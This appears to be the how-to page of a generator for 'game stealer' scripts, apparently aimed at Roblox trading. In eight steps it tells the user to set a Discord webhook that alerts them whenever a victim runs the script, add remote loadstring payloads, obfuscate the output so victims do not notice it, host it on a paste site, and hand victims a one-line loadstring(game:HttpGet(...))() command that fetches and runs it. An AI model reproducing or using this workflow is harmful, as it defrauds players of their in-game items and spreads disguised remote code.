How to Use

        
1st Step
Choose what game stealer you want to make.

        
2nd Step
Put your username (the account you want the victim to send trade to).

        

            
3rd Step

            
Add webhook (this is important). Whenever someone executes your stealer, it will send to your Discord webhook so you can join the victim and start the trade.

            
Don’t know how to make a webhook?

            
PC: https://youtu.be/fKksxz2Gdnc

            Mobile: https://youtube.com/shorts/CFlu2ReHmzs

        

        

            
4th Step (Optional • Recommended)

            
Add a loadstring that runs with the stealer.

            
Key loadstring vs Normal loadstring:

            
Key scripts are paid scripts that you buy or get. They have a key, for example:

            
getgenv().SCRIPT_KEY = "whatever your key is"

            
and it runs with the owner’s loadstring panel:

            
loadstring(game:HttpGet("the keys loadstring"))()

            
This is how a key mode script looks like:

            
getgenv().SCRIPT_KEY = "The key"

            loadstring(game:HttpGet("the key mode loadstring"))()

            
Normal loadstring:

            
loadstring(game:HttpGet("it’s just a loadstring contains the script inside this"))()

            
⚠ WARNING: Don’t put visual scripts you don’t know what’s inside. They probably have a dualhook meaning they can have a stealer inside and rob you. I recommend using open source code as visual.

        

        
5th Step
Generate your script → Copy the whole thing. That’s your stealer that you will give your victims. But they might not be stupid and fall for it, so it’s better to obfuscate it (6th step).

        
6th Step
Go to https://wearedevs.net/obfuscator. Paste everything that you copied from the output of the generator and obfuscate it.

        
7th Step
Go to https://pastefy.app and paste the obfuscated code. Click Raw to get the raw link.
Your raw should look like:
https://pastefy.app/M5IJUxpw/raw

        
8th Step
Paste your raw into this:
loadstring(game:HttpGet("Your raw here no spaces between the strings"))()
That’s it.
